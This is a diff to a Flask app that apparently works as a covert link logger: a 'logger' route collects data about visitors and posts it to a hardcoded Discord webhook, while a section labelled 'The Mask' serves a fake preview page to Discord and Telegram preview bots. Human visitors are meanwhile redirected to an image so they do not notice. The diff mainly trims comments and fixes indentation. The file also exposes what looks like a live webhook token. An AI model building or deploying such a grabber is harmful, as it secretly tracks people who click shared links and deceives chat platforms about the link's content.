@@ -4,7 +4,7 @@ from flask import Flask, request, redirect
 
 app = Flask(__name__)
 
-# YOUR WEBHOOK URL GOES HERE
+# YOUR WEBHOOK URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499375993515802814/k7NlaKYQ6E9E89EvLFXmqYmQHzSldINIRkq3CZB2JqImHP4ROw7Wa2qbjLtFhgitQmKe"
 
 @app.route('/')
@@ -23,10 +23,9 @@ def logger():
     except:
         pass
 
-    # 3. The "Mask": This tells Discord to show a preview box
-    # We check if the "User-Agent" is Discord's preview bot
+    # 3. The Mask
     user_agent = request.user_agent.string.lower()
-   if "discord" in user_agent or "telegram" in user_agent:
+    if "discord" in user_agent or "telegram" in user_agent:
         return '''
         <html>
             <head>
@@ -39,7 +38,7 @@ def logger():
         </html>
         '''
     
-    # 4. The Redirect: Real people go to the image
+    # 4. The Redirect
     return redirect("https://i.imgur.com/BcNs5vF.jpg")
 
 if __name__ == "__main__":
